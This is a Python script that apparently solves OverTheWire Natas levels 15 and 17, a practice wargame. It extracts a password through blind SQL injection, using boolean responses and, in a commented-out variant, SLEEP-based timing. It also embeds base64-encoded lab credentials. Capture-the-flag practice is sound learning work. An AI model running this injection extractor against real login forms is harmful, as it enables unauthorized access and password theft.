import requests


def get_password():
    password = ""

    while len(password) < 32:
        # Check if the password has a number by ASCII code
        for i in range(48, 58):  # 0-9
            char = chr(i)
            query = create_query(password, char)
            r = send_request(query)

            if check_user_exists(r):
                password += chr(i)
                print(password)
            else:
                print(f'{password + char} not found')

        # Check if the password has an upper case letter by ASCII code
        for i in range(65, 91):  # A-Z
            char = chr(i)
            query = create_query(password, char)
            r = send_request(query)

            if check_user_exists(r):
                password += chr(i)
                print(password)
            else:
                print(f'{password + char} not found')

        # Check if the password has a lower case letter by ASCII code
        for i in range(97, 123):  # a-z
            char = chr(i)
            query = create_query(password, char)
            r = send_request(query)

            if check_user_exists(r):
                password += chr(i)
                print(password)
            else:
                print(f'{password + char} not found')

    return password


# Check if the user exists by the type of response
def check_user_exists(r):
    if "This user exists" in r.text:
        return True
    else:
        return False


# def check_user_exists(r):
#     if r.elapsed.total_seconds() > 2:
#         return True
#     else:
#         return False


# Create the query to send to the server
def create_query(password, char):
    # return f'natas18" AND password LIKE BINARY "{password + char}%" AND SLEEP(2)#'
    return f'natas16" AND password LIKE BINARY "{password + char}%'


# Send the post request to the server
def send_request(query):
    # return requests.post(
    #     "http://natas17.natas.labs.overthewire.org/index.php",
    #     headers={
    #         "Authorization": "Basic bmF0YXMxNzpFcWpISmJvN0xGTmI4dndoSGI5czc1aG9raDVURjBPQw=="
    #     },
    #     data={"username": query},
    # )

    return requests.post(
        "http://natas15.natas.labs.overthewire.org/index.php",
        headers={
            "Authorization": "Basic bmF0YXMxNTpTZHFJcUJzRmN6M3lvdGxOWUVyWlNad2Jsa20wbHJ2eA=="
        },
        data={"username": query},
    )


obtained_password = get_password()
